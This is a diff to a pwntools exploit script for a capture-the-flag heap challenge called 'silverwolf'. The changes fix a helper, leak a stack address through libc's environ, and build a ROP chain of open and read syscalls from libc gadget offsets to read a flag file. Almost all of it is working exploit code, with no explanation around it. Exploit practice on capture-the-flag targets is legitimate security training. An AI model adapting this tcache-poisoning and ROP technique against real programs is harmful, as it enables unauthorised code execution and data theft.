@@ -3,7 +3,7 @@ from pwn import *
 context(arch = "amd64", os = "Linux", log_level = "Debug")
 io = process("./silverwolf")
 # io = remote("124.70.130.92", 60001)
-gdb.attach(io)
+# gdb.attach(io)
 
 s       = lambda data               :io.send(data)
 sa      = lambda delim,data         :io.sendafter(str(delim), data)
@@ -55,7 +55,7 @@ def str2i(string):
             sum = 0
         sum *= 0x100
     result += p64(sum)
-    return sum
+    return result
 
 for i in range(8):
     add(0x78)
@@ -110,6 +110,10 @@ push_rax = libc_addr + 0x3dfed
 read_addr = libc_addr + 0x110070
 fopen_addr = libc_addr + 0x7ee30
 environ = libc_addr + 0x3ee098
+syscall_addr = libc_addr + 0xd2975
+pop_rax= libc_addr + 0x439c8
+mov_rax_rsi = libc_addr + 0x587f3
+mov_rax_2 = libc_addr + 0xd0e40
 
 add(0x10)
 delete()
@@ -118,33 +122,36 @@ edit(p64(environ))
 add(0x10)
 add(0x10)
 show()
-stack_addr = u64(rl()[:6].ljust(8, '\0'))
+stack_addr = u64(rl()[:6].ljust(8, '\0')) - 0x120
 log.info("Stack address : " + hex(stack_addr))
 
-add(0x10)
+add(0x30)
 delete()
 delete()
 show()
-string1_addr = u64(rl()[:6].ljust(8, "\0"))
-edit(str2i("/flag.txt"))
+string_addr = u64(rl()[:6].ljust(8, "\0"))
+edit("./flag.txt" + "\0" + "r")
+flag_addr = string_addr + 0x10
 
-add(0x20)
-delete()
-delete()
-show()
-string2_addr = u64(rl()[:6].ljust(8, '\0'))
-edit(str2i("r"))
 
 add(0x78)
 delete()
 delete()
-show()
-flag_addr = u64(rl()[:6].ljust(8, '\0'))
-
-rop  = p64(pop_rdi) + p64(string1_addr) + p64(pop_rsi) + p64(string2_addr)
-rop += p64(fopen_addr)
 
 edit(p64(stack_addr))
 add(0x78)
 add(0x78)
-edit()
+show()
+ret_addr = u64(rl()[:6].ljust(8, '\0')) + 0x10 - 0xd7 + 0x110 + 0x380
+log.info("Return address is : " + hex(ret_addr))
+
+rop  = p64(pop_rdi) + p64(string_addr) + p64(pop_rsi) + p64(0)
+rop += p64(mov_rax_2) + p64(syscall_addr) + p64(mov_rax_rsi) + p64(pop_rsi)
+rop += p64(stack_addr) + p64(pop_rdi) + p64(3) + p64(pop_rdx)
+rop += p64(0x20) + p64(syscall_addr) + p64(ret_addr)
+
+edit(rop)
+pause()
+rl()
+
+
